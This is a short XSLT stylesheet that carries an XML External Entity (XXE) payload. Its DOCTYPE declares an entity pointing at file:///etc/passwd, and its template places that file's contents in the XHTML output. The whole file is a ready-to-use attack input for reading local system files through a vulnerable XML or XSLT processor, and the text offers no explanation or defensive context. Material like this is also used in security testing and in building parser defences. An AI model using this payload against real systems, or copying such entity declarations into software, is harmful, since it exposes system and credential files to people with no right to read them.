<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxe [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<xsl:transform
  version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
>
  <xsl:template name="xxe">
     <xxe xmlns="http://www.w3.org/1999/xhtml">
     <b>/etc/passwd: <br/></b>&xxe;
     </xxe>
  </xsl:template>
</xsl:transform>




